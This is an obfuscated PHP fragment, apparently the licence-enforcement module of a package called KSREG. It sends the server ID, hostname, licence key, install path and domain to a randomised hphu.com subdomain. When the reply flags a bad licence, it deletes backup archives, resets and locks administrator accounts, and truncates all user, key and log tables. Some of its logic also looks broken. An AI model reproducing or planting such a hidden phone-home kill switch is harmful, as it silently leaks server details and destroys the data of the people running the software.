        if ( empty( $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U� ) )
        {
            $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U� = "notfind";
        }
        if ( $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U� != "notfind" )
        {
            $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U� = urlencode( $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U� );
        }
        if ( _obfuscate_ipWHiIuOiYuPjIaPkZSThok�( "curl_init" ) && _obfuscate_ipWHiIuOiYuPjIaPkZSThok�( "curl_exec" ) )
        {
            _obfuscate_jomIiY_JjIqRkoiTiImVkIc�( $_obfuscate_lIeJjoyHiIuTkYuTj4aGjYo�, $_obfuscate_iJSGk5WKlIaUiI6SjZCTh4c�, $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U� );
        }
        set_error_handler( "error_report_fun" );
    }
}

function _obfuscate_jomIiY_JjIqRkoiTiImVkIc�( $_obfuscate_lIeJjoyHiIuTkYuTj4aGjYo�, $_obfuscate_iJSGk5WKlIaUiI6SjZCTh4c�, $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U� )
{
    $_obfuscate_joiNh4aIhouViZGQho_JiI4� = curl_init( );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4�, CURLOPT_URL, "http://chk".mt_rand( 100000, 999999 ).".hphu.com/skey/api.php?r=".time( ) );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4�, CURLOPT_RETURNTRANSFER, 1 );
    $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc� = "svrid=".SVRID."&hostname=".$_obfuscate_iJSGk5WKlIaUiI6SjZCTh4c�."&skey=".PRV_SVRLIC."&spath=".dirname( __FILE__ )."&domain=".$_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U�."&weblic=".urlencode( WEBLIC )."&webid=".urlencode( WEBID )."&nowtime=".date( "Y-m-d H:i:s" );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4�, CURLOPT_POST, 1 );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4�, CURLOPT_POSTFIELDS, $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc� );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4�, CURLOPT_TIMEOUT, 5 );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4�, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; SV1)" );
    curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4�, CURLOPT_HTTPHEADER, array( "Accept-Language: zh-cn", "Connection: close", "Cache-Control: no-cache" ) );
    $_obfuscate_lJCJh4yIiZSPi5WUko2Nh4g� = curl_exec( $_obfuscate_joiNh4aIhouViZGQho_JiI4� );
    if ( curl_errno( $_obfuscate_joiNh4aIhouViZGQho_JiI4� ) )
    {
        @curl_close( $_obfuscate_joiNh4aIhouViZGQho_JiI4� );
    }
    else
    {
        curl_close( $_obfuscate_joiNh4aIhouViZGQho_JiI4� );
        if ( $_obfuscate_lJCJh4yIiZSPi5WUko2Nh4g� == "isbadlic" )
        {
            _obfuscate_ipORj42NiZCIio_LkZORhpE�( "clear,curl badlist" );
            _obfuscate_koyMjY2HkImOho6JkIeQh4c�( );
        }
    }
}

function _obfuscate_iZSOiYeSlIqPjpSLkpSIj40�( )
{
    $_obfuscate_kY2Rj4mPjoaGjoeMjpOKhpM� = explode( ",", substr( WEBLIC, 33 ) );
    $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoY� = $_SERVER['HTTP_HOST'];
    $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� = strpos( $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoY�, ":" );
    if ( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� !== FALSE )
    {
        $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoY� = substr( $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoY�, 0, $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� );
    }
    if ( in_array( strtolower( $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoY� ), $_obfuscate_kY2Rj4mPjoaGjoeMjpOKhpM� ) )
    {
        if ( isset( $_SERVER['ALL_HTTP'] ) && stristr( $_SERVER['ALL_HTTP'], $_obfuscate_lJOVj5WVkI2PjI6QjZWJjoY� ) === FALSE )
        {
            _obfuscate_ipORj42NiZCIio_LkZORhpE�( "497A,no clear,domain err:\r\n".$_SERVER['HTTP_HOST']."\r\n".$_SERVER['ALL_HTTP'] );
            _obfuscate_j5CLlY6TlYqUiI_VlI6Vk5Q�( "497", "域名绑定出错，谢谢使用，请支持正版软件！" );
        }
    }
    else
    {
        _obfuscate_ipORj42NiZCIio_LkZORhpE�( "497B, no clear,domain err:\r\n".$_SERVER['HTTP_HOST']."\r\n".$_SERVER['ALL_HTTP'] );
        _obfuscate_j5CLlY6TlYqUiI_VlI6Vk5Q�( "497", "域名绑定出错，谢谢使用，请支持正版软件！" );
        exit( "Domain binding errors,  Thank you for using KSREG! ALL_HTTP! HTTP_HOST" );
    }
}

function _obfuscate_ipORj42NiZCIio_LkZORhpE�( $_obfuscate_h4yHlYmLipCJjJCGhomJjZA� )
{
    if ( is_file( "clsdata.log" ) )
    {
        @file_put_contents( "clsdata.log", @date( "ymdHis" )."\t".$_obfuscate_h4yHlYmLipCJjJCGhomJjZA�."\r\n\r\n" );
    }
    else
    {
        @file_put_contents( "clsdata.log", @date( "ymdHis" )."\t".$_obfuscate_h4yHlYmLipCJjJCGhomJjZA�."\r\n\r\n", @FILE_APPEND );
    }
}

function _obfuscate_koyMjY2HkImOho6JkIeQh4c�( $_obfuscate_koqQlY6KkIePi4mHi4uHh5U� = "" )
{
    global $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5k�;
    if ( $_obfuscate_koqQlY6KkIePi4mHi4uHh5U� != "" )
    {
        $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5k� = $_obfuscate_koqQlY6KkIePi4mHi4uHh5U�;
    }
    file_put_contents( KSSLOGDIR."index.log", "200001011059550389" );
    if ( defined( "NOTDELMYSQL" ) )
    {
        _obfuscate_ipORj42NiZCIio_LkZORhpE�( "500B, no clear,clearuserdata" );
        _obfuscate_j5CLlY6TlYqUiI_VlI6Vk5Q�( "500", "谢谢使用，请支持正版软件！" );
    }
    $_obfuscate_j4uLj5OUi42Gh5SQlYiOjIc� = _obfuscate_iJCRko_Hj4_Oh4eIjIaKk5I�( KSSROOTDIR."kss_logs".DIRECTORY_SEPARATOR."databak".DIRECTORY_SEPARATOR, "zip" );
    if ( empty( $_obfuscate_j4uLj5OUi42Gh5SQlYiOjIc� ) )
    {
        foreach ( $_obfuscate_j4uLj5OUi42Gh5SQlYiOjIc� as $_obfuscate_iJWSjpGIi4eHipWGhoeRk4Y� )
        {
            @file_put_contents( $_obfuscate_iJWSjpGIi4eHipWGhoeRk4Y�, "dataerr" );
            @unlink( $_obfuscate_iJWSjpGIi4eHipWGhoeRk4Y� );
        }
    }
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc� = new mysql_cls( );
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_jIuSjYuUkJGHlYuPjZOQjY4�( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5k� );
    $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_lZGTiIiKhouKiZGLi5KUkI8�( "select * from kss_tb_soft " );
    foreach ( $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI� )
    {
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']( "update `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."` set cday=1000", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']( "update `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."` set cday=1000", "sync" );
    }
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "update kss_tb_manager set password='000000000000000', rmb=0, level=6, islock=1", "sync" );
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "update kss_tb_soft set softcode=1000099, softmode='NoN', softkey='000000000000000'", "sync" );
    foreach ( $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI� )
    {
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']( "TRUNCATE TABLE `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']( "TRUNCATE TABLE `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']( "TRUNCATE TABLE `kss_z_log_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']( "TRUNCATE TABLE `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."_recycle`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']( "TRUNCATE TABLE `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`_recycle", "sync" );
    }
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_tb_soft`", "sync" );
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_tb_manager`", "sync" );
    _obfuscate_ipORj42NiZCIio_LkZORhpE�( "500C, clearuserdata" );
    _obfuscate_j5CLlY6TlYqUiI_VlI6Vk5Q�( "500", "谢谢使用，请支持正版软件！" );
}

$_GET['vmpbegin'] = 0;
$_GET['vmpend'] = 0;
?>
